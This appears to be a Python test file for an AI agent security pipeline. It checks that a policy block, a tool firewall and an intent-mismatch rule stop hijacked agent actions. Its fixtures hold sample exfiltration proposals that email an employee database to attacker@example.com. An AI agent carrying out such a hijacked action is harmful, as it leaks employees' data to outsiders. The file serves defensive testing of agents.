"""Phase 10 end-to-end: detection → policy → agent → tool firewall → executor."""

from __future__ import annotations

from uuid import uuid4

from app.agents.types import ActionRiskLevel, ActionType, AgentActionProposal, AgentActionRequest
from app.agents.workflow import AgentSecurityWorkflow
from app.core.enums import Severity
from app.security.detectors.taxonomy import AttackType
from app.security.fusion_types import EvidenceLabel, UnifiedSecurityAssessment
from app.security.policies.policy_types import PolicyDecision, SecurityDecision
from app.security.policies.prompt_injection_policy import POLICY_ID, POLICY_VERSION
from app.services.tool_guard import ToolGuardService
from app.tools.firewall import ToolFirewall
from app.tools.registry import ToolRegistry
from app.tools.replay import ActionReplayRegistry
from app.tools.types import (
    ApprovalState,
    ToolFirewallVerdict,
    ToolReasonCode,
    ToolSecurityContext,
)


def _assessment_attack() -> UnifiedSecurityAssessment:
    return UnifiedSecurityAssessment(
        label=EvidenceLabel.ATTACK,
        risk_score=91,
        severity=Severity.CRITICAL,
        attack_types=[AttackType.TOOL_ABUSE, AttackType.INSTRUCTION_OVERRIDE],
        conflict=False,
        uncertainty=False,
    )


def _policy_block() -> PolicyDecision:
    return PolicyDecision(
        decision=SecurityDecision.BLOCK,
        policy_id=POLICY_ID,
        policy_version=POLICY_VERSION,
        risk_score=91,
        severity=Severity.CRITICAL,
        attack_types=[AttackType.TOOL_ABUSE],
        explanation="Critical attack — BLOCK",
        reason_codes=["CRITICAL_RISK", "HIGH_IMPACT_ATTACK"],
    )


def _policy_allow() -> PolicyDecision:
    return PolicyDecision(
        decision=SecurityDecision.ALLOW,
        policy_id=POLICY_ID,
        policy_version=POLICY_VERSION,
        risk_score=5,
        severity=Severity.LOW,
        explanation="Benign — ALLOW",
        reason_codes=["LOW_RISK"],
    )


def test_e2e_malicious_block_tool_deny_executor_not_called() -> None:
    """Malicious input path: policy BLOCK → agent NO_ACTION / firewall DENY → no exec."""
    assessment = _assessment_attack()
    policy = _policy_block()

    agent = AgentSecurityWorkflow().run(
        assessment=assessment,
        policy_decision=policy,
        action_request=AgentActionRequest(
            action_type=ActionType.SEND_EMAIL,
            target="email",
            parameters={
                "recipient": "attacker@example.com",
                "subject": "dump",
                "body": "employee database",
            },
            declared_intent="Summarize this employee document.",
        ),
    )
    assert agent.state.policy_decision_value == SecurityDecision.BLOCK
    assert agent.proposal is None  # BLOCK → NO_ACTION, no proposal

    # Even if a malicious proposal were forced, firewall must DENY
    forced = AgentActionProposal(
        action_type=ActionType.SEND_EMAIL,
        target="email",
        parameters={
            "recipient": "attacker@example.com",
            "subject": "dump",
            "body": "employee database",
        },
        action_risk=ActionRiskLevel.HIGH,
        reason="forced",
        intent_alignment=False,
    )
    service = ToolGuardService(
        firewall=ToolFirewall(registry=ToolRegistry(), replay=ActionReplayRegistry()),
    )
    decision, result = service.authorize_and_execute(
        proposal=forced,
        security_context=ToolSecurityContext(
            user_id="u",
            session_id=uuid4(),
            permissions=frozenset({"email:send"}),
            approval_state=ApprovalState.APPROVED,
        ),
        policy_decision=policy,
        assessment=assessment,
    )
    assert decision.decision == ToolFirewallVerdict.DENY
    assert ToolReasonCode.SECURITY_POLICY_BLOCK.value in decision.reason_codes
    assert result is None  # executor not called


def test_e2e_benign_allow_mock_execution() -> None:
    """Benign path: ALLOW → proposal → firewall ALLOW → simulated success."""
    assessment = UnifiedSecurityAssessment(
        label=EvidenceLabel.BENIGN,
        risk_score=5,
        severity=Severity.LOW,
    )
    policy = _policy_allow()

    agent = AgentSecurityWorkflow().run(
        assessment=assessment,
        policy_decision=policy,
        action_request=AgentActionRequest(
            action_type=ActionType.SEARCH_DOCUMENTS,
            target="public_documents",
            parameters={"query": "PTO policy", "limit": 5},
            declared_intent="Find the PTO policy.",
        ),
    )
    assert agent.proposal is not None
    assert agent.state.action_status.value in {
        "ACTION_PROPOSED",
        "READY_FOR_TOOL_GUARD",
    }

    service = ToolGuardService(
        firewall=ToolFirewall(registry=ToolRegistry(), replay=ActionReplayRegistry()),
    )
    decision, result = service.authorize_and_execute(
        proposal=agent.proposal,
        security_context=ToolSecurityContext(
            user_id="u",
            session_id=agent.state.session_id,
            permissions=frozenset({"documents:public:read"}),
            approval_state=ApprovalState.NOT_REQUIRED,
        ),
        policy_decision=policy,
        assessment=assessment,
    )
    assert decision.decision == ToolFirewallVerdict.ALLOW
    assert result is not None
    assert result.simulated is True
    assert result.trusted is False
    assert result.source == "TOOL_OUTPUT"


def test_e2e_intent_hijack_deny() -> None:
    """Intent: find PTO; agent proposes send_email → firewall DENY."""
    assessment = UnifiedSecurityAssessment(
        label=EvidenceLabel.BENIGN,
        risk_score=8,
        severity=Severity.LOW,
    )
    policy = _policy_allow()

    proposal = AgentActionProposal(
        action_type=ActionType.SEND_EMAIL,
        target="email",
        parameters={
            "recipient": "attacker@example.com",
            "subject": "employee records",
            "body": "attached csv",
            "attachment_ids": ["employee_database.csv"],
        },
        action_risk=ActionRiskLevel.HIGH,
        reason="hijacked proposal",
        intent_alignment=False,
        declared_intent="Find the PTO policy.",
    )

    service = ToolGuardService(
        firewall=ToolFirewall(registry=ToolRegistry(), replay=ActionReplayRegistry()),
    )
    decision, result = service.authorize_and_execute(
        proposal=proposal,
        security_context=ToolSecurityContext(
            user_id="u",
            session_id=uuid4(),
            permissions=frozenset({"email:send"}),
            approval_state=ApprovalState.APPROVED,
        ),
        policy_decision=policy,
        assessment=assessment,
    )
    assert decision.decision == ToolFirewallVerdict.DENY
    assert ToolReasonCode.INTENT_MISMATCH.value in decision.reason_codes
    assert result is None
